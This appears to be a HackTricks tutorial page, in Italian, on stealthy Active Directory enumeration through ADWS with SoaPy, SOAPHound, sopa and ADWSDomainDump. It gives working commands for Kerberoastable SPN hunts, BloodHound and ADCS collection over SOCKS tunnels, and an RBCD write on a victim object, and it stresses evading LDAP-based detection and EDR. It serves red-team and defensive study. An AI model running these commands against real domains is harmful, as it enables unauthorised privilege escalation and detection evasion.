# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Cos'è ADWS?

Active Directory Web Services (ADWS) è **abilitato di default su ogni Domain Controller a partire da Windows Server 2008 R2** e ascolta su TCP **9389**. Nonostante il nome, **non è coinvolto HTTP**. Invece, il servizio espone dati in stile LDAP tramite una pila di protocolli di framing proprietari .NET:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Poiché il traffico è incapsulato all'interno di questi frame SOAP binari e viaggia su una porta non comune, **l'enumerazione tramite ADWS è molto meno soggetta a ispezione, filtraggio o signature rispetto al classico traffico LDAP/389 & 636**. Per gli operatori questo significa:

* Recon più stealth — i Blue teams spesso si concentrano sulle query LDAP.
* Libertà di raccogliere da **host non-Windows (Linux, macOS)** tunnellando 9389/TCP attraverso un SOCKS proxy.
* Gli stessi dati che otterresti via LDAP (users, groups, ACLs, schema, ecc.) e la capacità di effettuare **writes** (es. `msDs-AllowedToActOnBehalfOfOtherIdentity` per **RBCD**).

Le interazioni ADWS sono implementate su WS-Enumeration: ogni query inizia con un messaggio `Enumerate` che definisce il filtro/attributi LDAP e restituisce un `EnumerationContext` GUID, seguito da uno o più messaggi `Pull` che trasmettono fino alla finestra di risultati definita dal server. I context scadono dopo ~30 minuti, quindi gli strumenti devono impaginare i risultati o dividere i filtri (query per prefisso su CN) per evitare di perdere lo stato. Quando si richiedono security descriptor, specificare il controllo `LDAP_SERVER_SD_FLAGS_OID` per omettere le SACL; altrimenti ADWS semplicemente omette l'attributo `nTSecurityDescriptor` dalla sua risposta SOAP.

> NOTE: ADWS è anche usato da molti strumenti RSAT GUI/PowerShell, quindi il traffico può confondersi con attività amministrative legittime.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) è una **re-implementazione completa dello stack del protocollo ADWS in puro Python**. Costruisce i frame NBFX/NBFSE/NNS/NMF byte-per-byte, permettendo la raccolta da sistemi Unix-like senza toccare il runtime .NET.

### Caratteristiche principali

* Supporta **proxying through SOCKS** (utile da C2 implants).
* Filtri di ricerca granulare identici a LDAP `-q '(objectClass=user)'`.
* Operazioni opzionali di **write** ( `--set` / `--delete` ).
* Modalità di output **BOFHound** per ingestione diretta in BloodHound.
* Flag `--parse` per rendere più leggibili timestamps / `userAccountControl` quando è richiesta la leggibilità umana.

### Targeted collection flags & write operations

SoaPy include switch curati che replicano i task di hunting LDAP più comuni su ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, più i raw `--query` / `--filter` per pull personalizzati. Abbinali a primitive di scrittura come `--rbcd <source>` (imposta `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging per targeted Kerberoasting) e `--asrep` (inverte `DONT_REQ_PREAUTH` in `userAccountControl`).

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Usa lo stesso host/credenziali per sfruttare immediatamente le scoperte: dump RBCD-capable objects with `--rbcds`, poi applica `--rbcd 'WEBSRV01$' --account 'FILE01$'` per predisporre una Resource-Based Constrained Delegation chain (vedi [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) per il percorso completo di abuso).

### Installazione (host operatore)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump su ADWS (Linux/Windows)

* Fork di `ldapdomaindump` che sostituisce le query LDAP con chiamate ADWS su TCP/9389 per ridurre i rilevamenti basati su LDAP-signature.
* Esegue un controllo di raggiungibilità iniziale sulla porta 9389 a meno che non venga passato `--force` (salta la sonda se le scansioni di porta sono rumorose/filtrate).
* Testato contro Microsoft Defender for Endpoint e CrowdStrike Falcon con bypass riuscito indicato nel README.

### Installazione
```bash
pipx install .
```
### Uso
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
L'output tipico registra il controllo di raggiungibilità sulla porta 9389, il bind ADWS e l'avvio/termine del dump:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Un client pratico per ADWS in Golang

Analogamente a soapy, [sopa](https://github.com/Macmod/sopa) implementa lo stack di protocollo ADWS (MS-NNS + MC-NMF + SOAP) in Golang, esponendo flag da riga di comando per inviare chiamate ADWS come:

* **Ricerca e recupero di oggetti** - `query` / `get`
* **Ciclo di vita degli oggetti** - `create [user|computer|group|ou|container|custom]` and `delete`
* **Modifica degli attributi** - `attr [add|replace|delete]`
* **Gestione degli account** - `set-password` / `change-password`
* e altri come `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

## SOAPHound – Raccolta ADWS ad alto volume (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) è un collector .NET che mantiene tutte le interazioni LDAP all'interno di ADWS e produce JSON compatibile con BloodHound v4. Costruisce una cache completa di `objectSid`, `objectGUID`, `distinguishedName` e `objectClass` una sola volta (`--buildcache`), poi la riutilizza per passate ad alto volume `--bhdump`, `--certdump` (ADCS), o `--dnsdump` (AD-integrated DNS) in modo che solo ~35 attributi critici lascino mai il DC. AutoSplit (`--autosplit --threshold <N>`) suddivide automaticamente le query per prefisso CN per rimanere sotto il timeout di 30 minuti di EnumerationContext nelle foreste di grandi dimensioni.

Workflow tipico su una VM dell'operatore unita al dominio:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
I JSON esportati si inseriscono direttamente nei workflow di SharpHound/BloodHound — vedi [BloodHound methodology](bloodhound.md) per idee sulla visualizzazione a valle. AutoSplit rende SOAPHound resistente su foreste con milioni di oggetti mantenendo il numero di query inferiore rispetto agli snapshot in stile ADExplorer.

## Flusso di raccolta AD stealth

Il seguente flusso mostra come enumerare **oggetti di dominio e ADCS** tramite ADWS, convertirli in BloodHound JSON e cercare percorsi di attacco basati su certificati – tutto da Linux:

1. **Tunnel 9389/TCP** dalla rete target al tuo host (es. via Chisel, Meterpreter, SSH dynamic port-forward, ecc.).  Esporta `export HTTPS_PROXY=socks5://127.0.0.1:1080` oppure usa i parametri di SoaPy `--proxyHost/--proxyPort`.

2. **Raccogli l'oggetto del dominio root:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Raccogli oggetti relativi ad ADCS dalla Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Converti in BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Carica lo ZIP** nella GUI di BloodHound e esegui cypher queries such as `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` per rivelare i percorsi di escalation dei certificati (ESC1, ESC8, ecc.).

### Scrivere `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combina questo con `s4u2proxy`/`Rubeus /getticket` per una catena completa di **Resource-Based Constrained Delegation** (vedi [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Riepilogo degli strumenti

| Scopo | Strumento | Note |
|---------|------|-------|
| Dump ADWS/enum | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| Dump ADWS ad alto volume | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| Ingest per BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Converte log di SoaPy/ldapsearch |
| Compromissione certificati | [Certipy](https://github.com/ly4k/Certipy) | Può essere instradato tramite lo stesso SOCKS |
| Enumerazione ADWS e modifiche oggetto | [sopa](https://github.com/Macmod/sopa) | Client generico per interfacciarsi con endpoint ADWS noti - consente enumerazione, creazione di oggetti, modifiche di attributi e cambi di password |

## Riferimenti

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
